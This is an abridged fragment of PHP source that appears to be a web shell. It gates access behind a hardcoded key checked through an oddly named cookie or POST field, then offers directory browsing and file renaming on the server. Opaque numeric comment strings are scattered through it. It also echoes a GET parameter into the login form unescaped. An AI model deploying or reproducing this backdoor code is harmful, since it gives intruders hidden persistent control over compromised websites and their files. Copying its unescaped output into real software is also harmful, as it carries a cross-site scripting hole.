...
$auth_key = "cc9536f8fe19f2b7903f49957b6ebc5c";
...
$pass = false;
if (isset($_COOKIE['pw_name_59067'])) {
    if(($_COOKIE['pw_name_59067']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_59067'])) {
        if(($_POST['pw_name_59067']) == $auth_key) {
            setcookie("pw_name_59067", $_POST['pw_name_59067']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_59067' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721762474860592 1721762474301177 1721762474136245 1721762474497447
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721762474860592 1721762474301177 1721762474136245 1721762474497447
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721762474860592 1721762474301177 1721762474136245 1721762474497447
            $name = PATH . "/" . $_GET['r'];
